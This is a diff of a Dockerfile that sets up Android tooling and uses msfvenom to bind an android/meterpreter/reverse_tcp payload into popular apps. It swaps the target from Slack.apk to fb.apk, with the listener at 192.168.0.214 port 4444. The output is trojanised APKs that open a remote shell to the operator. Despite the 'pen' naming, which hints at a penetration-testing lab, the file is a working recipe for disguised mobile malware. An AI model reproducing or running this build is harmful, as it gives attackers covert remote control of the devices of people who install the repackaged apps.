@@ -20,8 +20,7 @@ RUN sudo apt-get update && \
 		     sudo apt-get -y install aapt && \
 		      sudo apt-get -y install default-jre && \
 		       sudo apt-get -y install default-jdk && \
-				sudo apt-get -y install libssl-dev && \
-				 sudo apt-get -y install zipalign && \
+			sudo apt-get -y install zipalign
 
 RUN sudo /bin/bash -l -c '/usr/src/wdir/install-apktool.sh'
 
@@ -34,15 +33,8 @@ RUN sudo python3 -m pip install pysftp
 
 RUN sudo /bin/bash -l -c 'sudo python3 /usr/src/wdir/P-Scripts/get_file_sftp.py'
 
-RUN sudo ./fix_apktool.sh
+RUN sudo ./Apktool_Fix_Kali_2019/Apktool_Fix_Kali_2019.sh; exit 0
 
-RUN sudo /bin/bash -l -c 'msfvenom -x Slack.apk -k -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > SlackPen.apk'
-
-#RUN sudo apktool d -f -o original Slack.apk
-#RUN sudo apktool d -f -o payload SlackPen.apk
-
-#RUN sudo mkdir /usr/src/wdir/original/smali/com/metasploit/
-#RUN sudo mkdir /usr/src/wdir/original/smali/com/metasploit/stage/
-#RUN sudo cp /usr/src/wdir/payload/smali/com/metasploit/stage/Payload.smali /usr/src/wdir/original/smali/com/metasploit/stage
+RUN sudo /bin/bash -l -c 'msfvenom -x fb.apk -k -p android/meterpreter/reverse_tcp LHOST="192.168.0.214" LPORT=4444 R > fb_pen.apk'; exit 0
 
 RUN ls -la
